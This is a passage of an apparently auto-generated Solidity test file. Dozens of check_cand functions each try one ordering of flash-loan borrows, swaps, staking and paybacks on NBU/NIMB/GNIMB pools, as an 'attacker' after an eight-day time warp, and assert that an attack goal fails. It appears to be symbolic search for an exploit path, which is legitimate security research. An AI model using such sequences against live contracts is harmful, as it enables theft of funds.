        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3882(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3883(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3884(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3885(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3886(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3887(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3888(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3889(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3890(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3891(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3892(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3893(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3894(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3895(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3896(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3897(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3898(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3899(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3900(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3901(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3902(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3903(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3904(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3905(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3906(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3907(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3908(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3909(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3910(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3911(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3912(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3913(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3914(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3915(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3916(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3917(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3918(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3919(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3920(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3921(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3922(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3923(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3924(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3925(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3926(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3927(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
